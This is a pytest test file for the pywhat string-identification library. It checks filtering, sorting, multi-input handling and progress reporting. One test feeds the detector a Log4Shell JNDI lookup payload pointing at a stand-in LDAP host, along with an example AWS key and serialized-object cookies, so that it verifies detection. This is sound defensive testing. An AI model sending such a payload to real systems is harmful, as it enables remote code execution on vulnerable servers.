import os
import re

import pytest

from pywhat import identifier
from pywhat.filter import Distribution, Filter
from pywhat.helper import FRAGMENT, Keys
from pywhat.processors import Processor

r = identifier.Identifier()


def test_identifier_works():
    out = r.identify("DANHz6EQVoWyZ9rER56DwTXHWUxfkv9k2o")
    assert (
        "Dogecoin (DOGE) Wallet Address"
        in out["Regexes"]["text"][0]["Regex Pattern"]["Name"]
    )


def test_identifier_works2():
    out = r.identify("fixtures/file", only_text=False)
    assert "Ethereum (ETH) Wallet Address" in str(out)


def test_identifier_works3():
    out = r.identify("fixtures/file", only_text=False)
    assert "Dogecoin (DOGE) Wallet Address" in str(out)


def test_identifier_filtration():
    filter = {"Tags": ["Credentials"]}
    r = identifier.Identifier(dist=Distribution(filter))
    regexes = r.identify("fixtures/file", only_text=False)["Regexes"]["file"]
    for regex in regexes:
        assert "Credentials" in regex["Regex Pattern"]["Tags"]


def test_identifier_filtration2():
    filter1 = {"ExcludeTags": ["Identifiers"]}
    filter2 = {"Tags": ["Identifiers"], "MinRarity": 0.6}
    r = identifier.Identifier(dist=Distribution(filter1))
    regexes = r.identify("fixtures/file", only_text=False, dist=Distribution(filter2))[
        "Regexes"
    ]["file"]
    for regex in regexes:
        assert "Identifiers" in regex["Regex Pattern"]["Tags"]
        assert regex["Regex Pattern"]["Rarity"] >= 0.6


def test_identifier_sorting():
    r = identifier.Identifier(key=Keys.NAME, reverse=True)
    out = r.identify("fixtures/file", only_text=False)
    assert out["Regexes"]["file"]


def test_identifier_sorting2():
    out = r.identify("fixtures/file", only_text=False, key=Keys.RARITY, reverse=True)
    prev = None
    for match in out["Regexes"]["file"]:
        if prev is not None:
            assert prev >= match["Regex Pattern"]["Rarity"]
        prev = match["Regex Pattern"]["Rarity"]


def test_identifier_sorting3():
    out = r.identify("fixtures/file", only_text=False, key=Keys.NAME)
    prev = None
    for match in out["Regexes"]["file"]:
        if prev is not None:
            assert prev <= match["Regex Pattern"]["Name"]
        prev = match["Regex Pattern"]["Name"]


def test_identifier_sorting4():
    r = identifier.Identifier(key=Keys.NAME, reverse=True)
    out = r.identify("fixtures/file", only_text=False)
    prev = None
    for match in out["Regexes"]["file"]:
        if prev is not None:
            assert prev >= match["Regex Pattern"]["Name"]
        prev = match["Regex Pattern"]["Name"]


def test_identifier_sorting5():
    out = r.identify("fixtures/file", only_text=False, key=Keys.MATCHED)
    prev = None
    for match in out["Regexes"]["file"]:
        if prev is not None:
            assert prev <= match["Matched"]
        prev = match["Matched"]


def test_identifier_sorting6():
    out = r.identify("fixtures/file", only_text=False, key=Keys.MATCHED, reverse=True)
    prev = None
    for match in out["Regexes"]["file"]:
        if prev is not None:
            assert prev >= match["Matched"]
        prev = match["Matched"]


def test_only_text():
    out = r.identify("fixtures/file")
    assert out["Regexes"] is None

    out = r.identify("THM{7281j}}", only_text=True)
    assert "TryHackMe Flag Format" in out["Regexes"]["text"][0]["Regex Pattern"]["Name"]


def test_recursion():
    out = r.identify("fixtures", only_text=False)

    assert re.findall(r"\'(?:\/|\\\\)file\'", str(list(out["Regexes"].keys())))
    assert re.findall(
        r"\'(?:\/|\\\\)test(?:\/|\\\\)file\'", str(list(out["Regexes"].keys()))
    )


def test_boundaryless():
    r = identifier.Identifier(boundaryless=Filter())
    out = r.identify("127.0.0.1abrakadabra")
    assert (
        "Internet Protocol (IP) Address Version 4"
        in out["Regexes"]["text"][0]["Regex Pattern"]["Name"]
    )
    out = r.identify("127.0.0.1abrakadabra", boundaryless=Filter({"Tags": ["Media"]}))
    assert out["Regexes"] is None


def test_finditer():
    r = identifier.Identifier(boundaryless=Filter())
    out = r.identify("anon@random.org dad@gmail.com")
    assert "anon@random.org" in out["Regexes"]["text"][2]["Matched"]
    assert "dad@gmail.com" in out["Regexes"]["text"][3]["Matched"]


@pytest.mark.parametrize(
    "text, name, matched",
    [
        (
            'GET /?q=${jndi:ldap://example.com/a} HTTP/1.1" 200',
            "Log4Shell (Log4j JNDI Lookup) Payload",
            "${jndi:ldap://example.com/a}",
        ),
        (
            "databaseURL: 'https://pywhat-test.firebaseio.com',",
            "Firebase Realtime Database URL",
            "https://pywhat-test.firebaseio.com",
        ),
        (
            "Cookie: session=rO0ABXQABWhlbGxv; path=/",
            "Base64 Encoded Java Serialized Object",
            "rO0ABXQABWhlbGxv",
        ),
        (
            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n",
            "Amazon Web Services Access Key",
            "AKIAIOSFODNN7EXAMPLE",
        ),
        (
            "ingress allowed from 10.0.0.0/8 only",
            "Internet Protocol (IP) Address Version 4 CIDR Block",
            "10.0.0.0/8",
        ),
        (
            'Cookie: data=a:1:{s:4:"user";O:8:"stdClass":1:{s:2:"id";i:42;}}; path=/',
            "PHP Serialized Object",
            'a:1:{s:4:"user";O:8:"stdClass":1:{s:2:"id";i:42;}}',
        ),
    ],
)
def test_boundaryless_gf_regexes(text, name, matched):
    r = identifier.Identifier(boundaryless=Filter())
    out = r.identify(text)
    assert any(
        match["Regex Pattern"]["Name"] == name and match["Matched"] == matched
        for match in out["Regexes"]["text"]
    )


def test_identifier_sorting_directory(tmp_path):
    # The matches of every file of a directory are sorted, not only the
    # matches of the last file (whichever file the file system lists last)
    with open("fixtures/file", "rb") as file:
        contents = file.read()
    for name in ("a", "b"):
        (tmp_path / name).write_bytes(contents)
    out = r.identify(str(tmp_path), only_text=False, key=Keys.NAME)
    assert len(out["Regexes"]) == 2
    for matches in out["Regexes"].values():
        names = [match["Regex Pattern"]["Name"] for match in matches]
        assert names == sorted(names)


def test_identifier_sorting_without_matches():
    # Used to raise TypeError: 'NoneType' object is not subscriptable
    out = r.identify("nothing", key=Keys.NAME)
    assert out == {"File Signatures": None, "Regexes": None}


# Multiple inputs (issue #171)


def test_identify_inputs_single_input():
    # A single input is identified like with identify()
    for text in ["fixtures", "fixtures/file", "THM{hello}", "nothing"]:
        assert r.identify_inputs([text], only_text=False) == r.identify(
            text, only_text=False
        )


def test_identify_inputs_files():
    out = r.identify_inputs(["fixtures/file", "fixtures/test/file"], only_text=False)
    # Under their paths, as both files are called "file"
    assert list(out["Regexes"]) == ["fixtures/file", "fixtures/test/file"]
    assert (
        out["Regexes"]["fixtures/file"]
        == r.identify("fixtures/file", only_text=False)["Regexes"]["file"]
    )
    assert [match["Matched"] for match in out["Regexes"]["fixtures/test/file"]] == [
        "https://google.com"
    ]
    assert out["File Signatures"] is None


def test_identify_inputs_directory_and_text():
    out = r.identify_inputs(["fixtures", "THM{hello}"], only_text=False)
    assert set(out["Regexes"]) == {
        os.path.join("fixtures", "file"),
        os.path.join("fixtures", "test", "file"),
        "text",
    }
    assert out["Regexes"]["text"][0]["Matched"] == "THM{hello}"


def test_identify_inputs_texts():
    out = r.identify_inputs(["THM{hello}", "DANHz6EQVoWyZ9rER56DwTXHWUxfkv9k2o"])
    # The matches in every text are under "text", like in a single text
    assert list(out["Regexes"]) == ["text"]
    names = [match["Regex Pattern"]["Name"] for match in out["Regexes"]["text"]]
    assert "TryHackMe Flag Format" in names
    assert "Dogecoin (DOGE) Wallet Address" in names


def test_identify_inputs_only_text():
    # By default, like identify(), the inputs are text and not paths
    out = r.identify_inputs(["fixtures/file", "THM{hello}"])
    assert list(out["Regexes"]) == ["text"]
    assert [match["Matched"] for match in out["Regexes"]["text"]] == ["THM{hello}"]


def test_identify_inputs_nothing_found():
    assert r.identify_inputs(["nothing", ""], only_text=False) == {
        "File Signatures": None,
        "Regexes": None,
    }
    assert r.identify_inputs([]) == {"File Signatures": None, "Regexes": None}


def test_identify_inputs_file_signatures(tmp_path):
    image = str(tmp_path / "image.png")
    with open(image, "wb") as file:
        file.write(b"\x89PNG\r\n\x1a\nTHM{hello}\n")
    out = r.identify_inputs([image, "fixtures/test/file"], only_text=False)
    assert list(out["File Signatures"]) == [image]
    assert out["File Signatures"][image]["Filename Extension"] == "png"
    assert [match["Matched"] for match in out["Regexes"][image]] == ["THM{hello}"]


def test_identify_inputs_sorting():
    out = r.identify_inputs(
        ["fixtures/file", "THM{hello}", "fixtures"],
        only_text=False,
        key=Keys.NAME,
        reverse=True,
    )
    for matches in out["Regexes"].values():
        names = [match["Regex Pattern"]["Name"] for match in matches]
        assert names == sorted(names, reverse=True)

    # The key of the identifier is the default
    r_sorted = identifier.Identifier(key=Keys.MATCHED)
    out = r_sorted.identify_inputs(["THM{b}", "THM{a}"])
    assert [match["Matched"] for match in out["Regexes"]["text"]] == [
        "THM{a}",
        "THM{b}",
    ]


def test_identify_inputs_processors():
    class FlagCounter(Processor):
        names = ["TryHackMe Flag Format"]

        def __init__(self):
            self.count = 0

        def process(self, match):
            self.count += 1
            return match

    counter = FlagCounter()
    # A generator of processors is used for every input
    out = r.identify_inputs(["THM{a}", "THM{b}"], processors=(p for p in [counter]))
    assert counter.count == 2
    assert len(out["Regexes"]["text"]) == 2


# Everything as soon as it is found, and the progress of a search (issue #189)


def collect(found):
    """Put what iter_identify() yields together, like identify() does."""
    identified = {"File Signatures": {}, "Regexes": {}}
    for kind, location, value in found:
        if kind == "Regexes":
            identified[kind].setdefault(location, []).append(value)
        else:
            identified[kind][location] = value
    return {kind: value or None for kind, value in identified.items()}


@pytest.mark.parametrize(
    "text, options",
    [
        ("THM{hello} dad@gmail.com 127.0.0.1", {}),
        ("fixtures/file", {}),
        ("fixtures/file", {"only_text": False}),
        ("fixtures", {"only_text": False}),
        ("fixtures", {"only_text": False, "include_filenames": True}),
        ("nothing", {}),
        (["fixtures/file", "fixtures/test/file", "THM{hello}"], {"only_text": False}),
        (["fixtures"], {"only_text": False}),
        ([], {}),
    ],
)
def test_iter_identify_finds_what_identify_finds(text, options):
    identify = r.identify_inputs if isinstance(text, list) else r.identify
    assert collect(r.iter_identify(text, **options)) == identify(text, **options)


def test_iter_identify_yields_as_soon_as_found():
    progress = []
    found = r.iter_identify("THM{hello}", progress=progress.append)
    kind, location, match = next(found)
    assert (kind, location, match["Matched"]) == ("Regexes", "text", "THM{hello}")
    # The search is not complete yet
    assert progress[-1].regex == match["Regex Pattern"]["Name"]
    assert progress[-1].regexes_done < progress[-1].regexes
    list(found)
    assert progress[-1].regex is None


def test_iter_identify_fragments():
    # Whether a match is a fragment of a longer match (issue #232) is only
    # known once the whole text has been searched. The matches are yielded
    # before that, and get their "Fragment" key afterwards.
    r = identifier.Identifier(boundaryless=Filter())
    text = "0x52908400098527886E0F7030069857D2E4169EE7"
    found = r.iter_identify(text)
    _, _, first = next(found)
    assert FRAGMENT not in first
    rest = [match for _, _, match in found]
    assert all(FRAGMENT in match for match in [first, *rest])
    by_name = {match["Regex Pattern"]["Name"]: match for match in [first, *rest]}
    assert by_name["Ethereum (ETH) Wallet Address"][FRAGMENT] is False
    assert by_name["Phone Number"][FRAGMENT] is True
    assert [first, *rest] == r.identify(text)["Regexes"]["text"]


def test_iter_identify_file_signature(tmp_path):
    image = tmp_path / "image.png"
    image.write_bytes(b"\x89PNG\r\n\x1a\nTHM{hello}\n")
    found = list(r.iter_identify(str(image), only_text=False))
    # The file signature first, then the matches in the file
    kind, location, signature = found[0]
    assert (kind, location) == ("File Signatures", "image.png")
    assert signature["Filename Extension"] == "png"
    assert [
        (kind, location, match["Matched"]) for kind, location, match in found[1:]
    ] == [("Regexes", "image.png", "THM{hello}")]


def test_identify_progress_text():
    progress = []
    r.identify("THM{hello}", progress=progress.append)
    names = [regex["Name"] for regex in r.distribution.get_regexes()]
    regexes = len(names)
    # Before every regex, then once the text has been searched
    assert progress == [
        identifier.Progress("text", 0, 1, regexes_done, regexes, name)
        for regexes_done, name in enumerate(names)
    ] + [identifier.Progress("text", 1, 1, regexes, regexes, None)]


def test_identify_progress_dist():
    dist = Distribution(Filter({"Tags": ["CTF Flag"]}))
    progress = []
    r.identify("THM{hello}", dist=dist, progress=progress.append)
    names = {regex["Name"] for regex in dist.get_regexes()}
    assert {p.regex for p in progress} == names | {None}
    assert progress[-1].regexes == len(names)


def test_identify_progress_directory():
    progress = []
    out = r.identify("fixtures", only_text=False, progress=progress.append)
    regexes = len(r.distribution.get_regexes())
    assert len(progress) == 2 * (regexes + 1)
    # Once every file has been searched
    done = [p for p in progress if p.regex is None]
    assert [p.files_done for p in done] == [1, 2]
    assert all(p.files == 2 and p.regexes_done == p.regexes == regexes for p in done)
    assert {p.location for p in done} == set(out["Regexes"])
    # Before every regex in the files
    for p in progress:
        if p.regex is not None:
            assert p.files_done in (0, 1)
            assert 0 <= p.regexes_done < p.regexes == regexes


def test_identify_progress_texts_of_a_file():
    # Every regex is searched for in the name of the file too
    progress = []
    r.identify(
        "fixtures/test/file",
        only_text=False,
        include_filenames=True,
        progress=progress.append,
    )
    regexes = 2 * len(r.distribution.get_regexes())
    assert len(progress) == regexes + 1
    assert progress[-1] == identifier.Progress("file", 1, 1, regexes, regexes, None)


def test_identify_inputs_progress():
    # The files of all inputs are searched one after another
    progress = []
    r.identify_inputs(
        ["fixtures", "THM{hello}", "fixtures/test/file"],
        only_text=False,
        progress=progress.append,
    )
    done = [p for p in progress if p.regex is None]
    assert [(p.files_done, p.files) for p in done] == [(1, 4), (2, 4), (3, 4), (4, 4)]
    assert [p.location for p in done][2:] == ["text", "fixtures/test/file"]

    # A single input like with identify()
    progress_identify = []
    r.identify("THM{hello}", progress=progress_identify.append)
    progress.clear()
    r.identify_inputs(["THM{hello}"], progress=progress.append)
    assert progress == progress_identify


def test_identify_progress_nothing_to_search(tmp_path):
    progress = []
    out = r.identify(str(tmp_path), only_text=False, progress=progress.append)
    assert out == {"File Signatures": None, "Regexes": None}
    assert progress == []


def test_progress_is_exported():
    import pywhat

    assert pywhat.Progress is identifier.Progress
    assert "Progress" in pywhat.__all__
